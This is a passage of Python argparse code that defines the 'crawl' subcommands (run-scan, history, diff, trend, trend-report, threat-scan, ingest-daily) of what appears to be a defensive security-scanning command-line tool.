        "--feed-to-cloud",
        action="store_true",
        help="Feed scan results to Navil cloud threat intel endpoint",
    )
    sched_parser.set_defaults(func=lambda cli, args: _schedule_command(cli, args))

    # ── crawl run-scan ────────────────────────────────────────
    run_parser = crawl_sub.add_parser(
        "run-scan",
        help="Run a one-off full scan pipeline (crawl + scan + store)",
    )
    run_parser.add_argument(
        "--limit",
        type=int,
        default=0,
        help="Max servers to crawl (0 = unlimited)",
    )
    run_parser.add_argument(
        "--timeout",
        type=int,
        default=30,
        help="Timeout per scan in seconds (default: 30)",
    )
    run_parser.add_argument(
        "--webhook",
        default=None,
        help="Webhook URL to notify when scan completes",
    )
    run_parser.add_argument(
        "--json",
        action="store_true",
        help="Output full result as JSON",
    )
    run_parser.set_defaults(func=lambda cli, args: _run_scan_command(cli, args))

    # ── crawl history ─────────────────────────────────────────
    hist_parser = crawl_sub.add_parser(
        "history",
        help="Show scan history",
    )
    hist_parser.add_argument(
        "--limit",
        type=int,
        default=20,
        help="Max number of scans to show (default: 20)",
    )
    hist_parser.add_argument(
        "--json",
        action="store_true",
        help="Output as JSON",
    )
    hist_parser.set_defaults(func=lambda cli, args: _history_command(cli, args))

    # ── crawl diff ────────────────────────────────────────────
    diff_parser = crawl_sub.add_parser(
        "diff",
        help="Compare two scan runs",
    )
    diff_parser.add_argument(
        "scan1",
        type=int,
        help="First (older) scan ID",
    )
    diff_parser.add_argument(
        "scan2",
        type=int,
        help="Second (newer) scan ID",
    )
    diff_parser.add_argument(
        "--json",
        action="store_true",
        help="Output as JSON instead of Markdown",
    )
    diff_parser.add_argument(
        "-o",
        "--output",
        default=None,
        help="Output file path for Markdown report",
    )
    diff_parser.set_defaults(func=lambda cli, args: _diff_command(cli, args))

    # ── crawl trend ───────────────────────────────────────────
    trend_parser = crawl_sub.add_parser(
        "trend",
        help="Show security trends over time",
    )
    trend_parser.add_argument(
        "--last",
        type=int,
        default=5,
        help="Number of recent scans to analyze (default: 5)",
    )
    trend_parser.add_argument(
        "--server",
        default=None,
        help="Show trend for a specific server",
    )
    trend_parser.add_argument(
        "--json",
        action="store_true",
        help="Output as JSON instead of Markdown",
    )
    trend_parser.add_argument(
        "-o",
        "--output",
        default=None,
        help="Output file path for Markdown report",
    )
    trend_parser.set_defaults(func=lambda cli, args: _trend_command(cli, args))

    # ── crawl trend-report ────────────────────────────────────
    tr_parser = crawl_sub.add_parser(
        "trend-report",
        help="Generate publishable monthly trend report",
    )
    tr_parser.add_argument(
        "--last",
        type=int,
        default=0,
        help="Number of recent scans to include (0 = all)",
    )
    tr_parser.add_argument(
        "--json",
        action="store_true",
        help="Output as JSON instead of Markdown",
    )
    tr_parser.add_argument(
        "-o",
        "--output",
        default=None,
        help="Output file path for report",
    )
    tr_parser.set_defaults(func=lambda cli, args: _trend_report_command(cli, args))

    # ── crawl threat-scan ────────────────────────────────────
    threat_parser = crawl_sub.add_parser(
        "threat-scan",
        help="Crawl threat intel sources for novel attack vectors",
    )
    threat_parser.set_defaults(func=lambda cli, args: _threat_scan_command(cli, args))

    # ── crawl ingest-daily ────────────────────────────────────
    ingest_parser = crawl_sub.add_parser(
        "ingest-daily",
        help="Ingest daily_threats/YYYY-MM-DD.yaml into public_attacks.yaml",
    )
    ingest_parser.add_argument(
        "--date",
        default=None,
        help="Date to ingest (YYYY-MM-DD). Defaults to today.",
    )
    ingest_parser.set_defaults(func=lambda cli, args: _ingest_daily_command(cli, args))
